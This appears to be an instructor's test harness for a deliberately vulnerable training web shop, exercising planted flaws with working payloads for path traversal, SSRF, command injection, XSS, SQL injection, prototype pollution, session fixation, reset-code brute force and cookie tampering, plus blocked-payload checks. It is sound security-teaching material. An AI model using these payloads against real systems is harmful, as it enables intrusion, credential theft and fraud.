#!/usr/bin/env python3
"""
Petal & Stem - instructor verification harness.
Confirms all 25 intentional vulnerabilities are exploitable AND that the lab
containment rules hold. Usage:  python3 scripts/verify_lab.py [base_url]
Run against a FRESH deployment (it changes passwords/emails of seed users).
"""
import sys, re, base64, json, time, html, hashlib
from urllib.parse import unquote
import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1:8080').rstrip('/')
results = []

def check(name, ok, detail=''):
    results.append((name, bool(ok)))
    print(f"[{'PASS' if ok else 'FAIL'}] {name}" + (f"  -- {detail}" if detail and not ok else ''))

def token(s, path='/login'):
    m = re.search(r'name="_csrf" value="([a-f0-9]+)"', s.get(BASE + path).text)
    return m.group(1) if m else ''

def login(user, pw, portal='/login'):
    s = requests.Session()
    t = token(s, portal)
    r = s.post(BASE + portal, data={'_csrf': t, 'username': user, 'password': pw})
    return s, r

daisy, _ = login('daisy', 'daisy123')
jasper, _ = login('jasper', 'password1')
florist, _ = login('florist', 'Bloom2024!', '/backoffice/login')
anon = requests.Session()

print('\n== A01 Broken Access Control ==')
r = daisy.get(BASE + '/account/invoices/download', params={'file': '../../../../../../etc/passwd'})
check('CWE-22 traversal reads /etc/passwd', 'root:' in r.text)
r = daisy.get(BASE + '/account/invoices/download', params={'file': '/etc/hosts'})
check('CWE-22 traversal reads /etc/hosts', 'localhost' in r.text)
for f in ['../../../../etc/shadow', '../../server.js', '../../.env', '/proc/self/environ', '../../../../etc/group', '....//....//etc/passwd%00.pdf']:
    r = daisy.get(BASE + '/account/invoices/download', params={'file': f})
    check(f'  containment: {f} blocked', r.status_code == 404 and 'root:' not in r.text and 'SESSION' not in r.text)
r = daisy.get(BASE + '/account/invoices/download', params={'file': 'INV-PS-10421.pdf'})
check('  own invoice downloads', r.content.startswith(b'%PDF'))
r = daisy.get(BASE + '/account/invoices/download', params={'file': 'INV-PS-10426.pdf'})
check('  another customer\'s invoice is refused', r.status_code == 404)

r = daisy.get(BASE + '/account/email', params={'email': 'daisy.pwned@attacker.test'}, allow_redirects=False)
me = daisy.get(BASE + '/api/v1/me').json()
check('CWE-352 email change via tokenless GET', me['user']['email'] == 'daisy.pwned@attacker.test')
r = daisy.post(BASE + '/account/profile', data={'full_name': 'X'}, allow_redirects=False)
check('  containment: other forms require CSRF token', r.status_code == 403)
daisy.get(BASE + '/account/email', params={'email': 'daisy@example.com'})

r = anon.get(BASE + '/backups/')
check('CWE-548 directory listing on /backups/', '.sql.bak' in r.text)
check('  containment: no listing on /images/', anon.get(BASE + '/images/').status_code == 404)

t = token(daisy, '/bouquet')
r = daisy.post(BASE + '/bouquet/preview', json={'url': 'http://127.0.0.1:3000/internal/inventory-sync'}, headers={'X-CSRF-Token': t}).json()
check('CWE-918 SSRF reaches loopback-only endpoint', 'FLAG{ssrf' in r.get('body', ''), str(r)[:200])
r = daisy.post(BASE + '/bouquet/preview', json={'url': 'file:///etc/shadow'}, headers={'X-CSRF-Token': t}).json()
check('  containment: non-HTTP schemes refused', not r['ok'] and 'body' not in r)

check('CWE-615 credentials in HTML comment', 'florist / Bloom2024!' in anon.get(BASE + '/login').text)

print('\n== A02 Security Misconfiguration ==')
r = daisy.get(BASE + '/api/v1/me', headers={'Origin': 'http://evil.test'})
check('CWE-16 CORS reflects arbitrary Origin with credentials', r.headers.get('Access-Control-Allow-Origin') == 'http://evil.test' and r.headers.get('Access-Control-Allow-Credentials') == 'true')
r = anon.get(BASE + '/debug/env').json()
check('CWE-526 /debug/env leaks secrets', 'SESSION_SECRET' in r['env'] and 'DB_PASSWORD' in r['env'])
r = requests.post(BASE + '/login', data={})  # any response that sets the session cookie
sc = requests.get(BASE + '/login').headers.get('Set-Cookie', '')
check('CWE-1004 session cookie lacks HttpOnly', 'bloom.sid' in sc and 'httponly' not in sc.lower(), sc)

print('\n== A03 Supply chain ==')
check('CWE-1035 jQuery 1.12.4 served to clients', 'jquery-1.12.4' in anon.get(BASE + '/').text)
t = token(jasper, '/account')
check('  jasper starts without Petal Club', 'FLAG{proto' not in jasper.get(BASE + '/members').text)
r = jasper.post(BASE + '/api/v1/preferences', data=json.dumps({'__proto__': {'isVip': True, 'isAdmin': True, 'toString': 1}}), headers={'Content-Type': 'application/json', 'X-CSRF-Token': t})
check('CWE-1395 lodash 4.17.4 prototype pollution grants Petal Club', 'FLAG{proto' in jasper.get(BASE + '/members').text, r.text)
check('  containment: app still healthy after hostile gadgets', anon.get(BASE + '/shop').status_code == 200 and jasper.get(BASE + '/admin').status_code == 403)
admin_s, _ = login('admin', 'sunflower1', '/backoffice/login')
admin_s.post(BASE + '/admin/lab/reset', data={'_csrf': token(admin_s, '/admin')})
check('  admin "Reset lab state" clears pollution', 'FLAG{proto' not in jasper.get(BASE + '/members').text)

print('\n== A04 Cryptographic Failures ==')
r = anon.get(BASE + '/')
check('CWE-319 served over HTTP without HSTS', BASE.startswith('http://') and 'Strict-Transport-Security' not in r.headers)
r = anon.get(BASE + '/track', params={'order': "' UNION SELECT username,password_hash,email,role,id FROM users WHERE username='admin'-- -"})
check('CWE-328 unsalted MD5 password hashes', hashlib.md5(b'sunflower1').hexdigest() in r.text)

print('\n== A05 Injection ==')
def diag(host):
    t = token(florist, '/staff/diagnostics')
    return html.unescape(florist.post(BASE + '/staff/diagnostics', data={'_csrf': t, 'host': host}).text)
for payload, marker in [('127.0.0.1; id', 'uid='), ('127.0.0.1 | whoami', None), ('127.0.0.1 && pwd', '/'), ('127.0.0.1; ip a', 'inet '), ('$(whoami)', None), ('127.0.0.1`id`', 'groups=')]:
    out = diag(payload)
    m = re.search(r'<pre class="console">(.*?)</pre>', out, re.S); body = m.group(1) if m else ''
    ok = ('valid hostname' not in out) and (marker in body if marker else len(body.strip()) > 0)
    check(f'CWE-77 command injection: {payload!r}', ok, body[:120])
for payload in ['127.0.0.1; cat /etc/passwd', '127.0.0.1; ls', '127.0.0.1; id; ls', '127.0.0.1; id #', '127.0.0.1; ip a > /tmp/x', '127.0.0.1; uname -a', '127.0.0.1 && whoami && cat /etc/shadow', '$(cat /etc/passwd)', '127.0.0.1; ID']:
    check(f'  containment: {payload!r} rejected', 'valid hostname' in diag(payload))

ok_payload = '<img src=x onerror=confirm(document.domain)>'
check('CWE-80 reflected XSS in /shop?q=', ok_payload in anon.get(BASE + '/shop', params={'q': ok_payload}).text)
for p in ['<script>confirm(1)</script>', '<ScRiPt src=//x></script>', '<img src=x onerror=alert(1)>', '<img src=x onerror=&#97;lert(1)>', '<svg onload=\\u0061lert(1)>', '<a href="javascript:%61lert(1)">x</a>']:
    check(f'  containment: {p[:38]!r} not reflected raw', p not in anon.get(BASE + '/shop', params={'q': p}).text)

t = token(daisy, '/product/regal-lily-stems')
stored = '<svg onload=confirm(document.cookie)>'
daisy.post(BASE + '/product/regal-lily-stems/review', data={'_csrf': t, 'rating': 5, 'body': 'Lovely ' + stored})
check('CWE-80 stored XSS in product reviews', stored in anon.get(BASE + '/product/regal-lily-stems').text)
r = daisy.post(BASE + '/product/regal-lily-stems/review', data={'_csrf': t, 'rating': 5, 'body': '<img src=x onerror=alert(1)>'})
check('  containment: review with alert refused', 'can&#39;t be published' in r.text or "can't be published" in html.unescape(r.text))

r = anon.get(BASE + '/track', params={'order': "' UNION SELECT username,password_hash,email,role,id FROM users-- -"})
check('CWE-89 UNION SQLi dumps users table', 'florist@petalstem.local' in r.text)
r = anon.get(BASE + '/track', params={'order': "' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4,5-- -"})
check('  containment: LOAD_FILE denied (no FILE privilege)', 'root:' not in r.text)

print('\n== A06 Insecure Design ==')
s = requests.Session(); t = token(s, '/register'); u = f'mallory{int(time.time())}'
s.post(BASE + '/register', data={'_csrf': t, 'full_name': 'Mallory', 'email': f'{u}@x.test', 'username': u, 'password': 'Password123', 'confirm': 'Password123', 'role': 'admin'})
check('CWE-266 role mass-assignment at registration', 'FLAG{admin_dashboard' in s.get(BASE + '/admin').text)
check('CWE-1021 /account has no anti-framing header', 'X-Frame-Options' not in daisy.get(BASE + '/account').headers)
check('  containment: other pages send X-Frame-Options: DENY', anon.get(BASE + '/').headers.get('X-Frame-Options') == 'DENY')

print('\n== A07 Authentication Failures ==')
s = requests.Session(); s.cookies.set('bloom_remember', base64.b64encode(b'admin|0').decode())
check('CWE-287 forged remember-me cookie logs in as admin', 'FLAG{admin_dashboard' in s.get(BASE + '/admin').text)
s = requests.Session(); t = token(s, '/backoffice/login'); codes = set()
for i in range(25):
    codes.add(s.post(BASE + '/backoffice/login', data={'_csrf': t, 'username': 'admin', 'password': f'wrong{i}'}).status_code)
r = s.post(BASE + '/backoffice/login', data={'_csrf': t, 'username': 'admin', 'password': 'sunflower1'})
check('CWE-308 single-factor back office, no lockout after 25 failures', 429 not in codes and 'FLAG{admin_dashboard' in r.text)

attacker = requests.Session(); token(attacker, '/login')
sid = attacker.cookies.get('bloom.sid')
victim = requests.Session(); victim.get(BASE + '/login', params={'sid': requests.utils.unquote(sid)})
t = token(victim, '/login')
victim.post(BASE + '/login', data={'_csrf': t, 'username': 'rosalind', 'password': 'rosebud'})
check('CWE-384 session fixation via /login?sid=', 'Rosalind' in attacker.get(BASE + '/account').text)

s = requests.Session(); t = token(s, '/forgot'); s.post(BASE + '/forgot', data={'_csrf': t, 'identifier': 'jasper'})
fails = [s.post(BASE + '/forgot/verify', data={'_csrf': t, 'username': 'jasper', 'code': f'{n:04d}', 'password': 'Hijacked123'}).status_code for n in range(30)]
found = None
for n in range(10000):
    r = s.post(BASE + '/forgot/verify', data={'_csrf': t, 'username': 'jasper', 'code': f'{n:04d}', 'password': 'Hijacked123'}, allow_redirects=False)
    if r.status_code == 302: found = n; break
check('CWE-640 4-digit reset code brute-forced without lockout', found is not None and 429 not in fails, f'found={found}')

print('\n== A08 Software/Data Integrity ==')
jas2, _ = login('jasper', 'Hijacked123')
t = token(jas2, '/product/crimson-rose-dozen')
jas2.post(BASE + '/cart/add', data={'_csrf': t, 'product_id': 1, 'qty': 1})
cart = json.loads(base64.b64decode(unquote(jas2.cookies.get('bloom_cart')))); cart[0]['price'] = 0.01
for c in list(jas2.cookies):
    if c.name == 'bloom_cart': jas2.cookies.clear(c.domain, c.path, c.name)
jas2.cookies.set('bloom_cart', base64.b64encode(json.dumps(cart).encode()).decode())
t = token(jas2, '/checkout')
r = jas2.post(BASE + '/checkout', data={'_csrf': t, 'recipient': 'Me', 'address': '1 Test Street', 'date': time.strftime('%Y-%m-%d'), 'card': '4242424242424242', 'expiry': '12/30', 'cvc': '123'})
check('CWE-565 tampered cart cookie price accepted at checkout', 'Total paid' in r.text and '$6.96' in r.text, r.url)

print('\n== A09 Logging ==')
check('CWE-532 plaintext passwords in activity log', 'password=Bloom2024!' in html.unescape(florist.get(BASE + '/staff/logs').text))

print('\n== A10 Exceptional Conditions ==')
t = token(daisy, '/cart')
r = daisy.post(BASE + '/cart/coupon', data={'_csrf': t, 'code': '%E0%A4%A'})
check('CWE-755 malformed coupon dumps stack trace & DB details', r.status_code == 500 and 'URIError' in r.text and 'dbUser' in r.text)
check('  containment: global errors stay generic', 'stack' not in anon.get(BASE + '/product/does-not-exist').text.lower())

print('\n== Secure-by-default spot checks ==')
check('Open redirect blocked on login next=', 'evil' not in (login('daisy', 'daisy123')[0].post(BASE + '/login', data={'_csrf': '', 'username': 'x', 'password': 'y', 'next': '//evil.test'}, allow_redirects=False).headers.get('Location') or ''))
check('Staff area denied to customers', daisy.get(BASE + '/staff').status_code == 403)
check('Admin area denied to staff', florist.get(BASE + '/admin').status_code == 403)
check('Product search uses parameterised SQL', anon.get(BASE + '/shop', params={'q': "' OR 1=1-- -"}).status_code == 200)

passed = sum(1 for _, ok in results if ok)
print(f'\n{passed}/{len(results)} checks passed')
sys.exit(0 if passed == len(results) else 1)
